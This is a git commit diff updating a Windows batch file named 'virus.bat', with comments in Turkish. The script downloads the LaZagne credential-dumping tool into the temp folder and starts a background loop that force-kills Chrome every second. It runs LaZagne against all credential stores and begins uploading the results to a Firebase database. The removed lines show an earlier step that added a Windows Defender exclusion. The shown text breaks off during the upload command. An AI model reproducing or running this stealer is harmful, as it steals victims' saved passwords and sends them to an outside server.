f627a02e32f4e20af0d6d2fc45f75829ac661bde
Ayamet <ayamet2029@gmail.com>
2025-06-14 17:58:40 +0300

    Update virus.bat

--- main/virus.bat
+++ main/virus.bat
@@ -1,5 +1,6 @@
 @echo on
 setlocal enabledelayedexpansion
+
 set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZ_EXE=%TEMP%\lazagne.exe"
 set "RESULT_DIR=%TEMP%\results"
@@ -7,17 +8,24 @@ set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatab
 
 echo [*] Script basladi: %DATE% %TIME%
 
-if exist "%LAZ_EXE%" del /f /q "%LAZ_EXE%"
-powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
+:: LaZagne yoksa indir
+if not exist "%LAZ_EXE%" (
+    echo [*] LaZagne indiriliyor...
+    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
+) else (
+    echo [*] LaZagne zaten var.
+)
 
-powershell -Command "try { Add-MpPreference -ExclusionProcess '%LAZ_EXE%' } catch {}"
+:: Chrome'u sürekli kapatacak döngü başlat (arka planda)
+start "" cmd /c ":loop & taskkill /IM chrome.exe /F >nul 2>&1 & timeout /t 1 >nul & goto loop"
 
-taskkill /IM chrome.exe /F >nul 2>&1
-
+:: Sonuç klasörü yoksa oluştur
 if not exist "%RESULT_DIR%" mkdir "%RESULT_DIR%"
 
+:: LaZagne çalıştır
 "%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"
 
+:: Firebase'e yükle
 for %%F in ("%RESULT_DIR%\*") do (
     powershell -Command ^
       "$content = Get-Content -Raw -Path '%%F'; ^
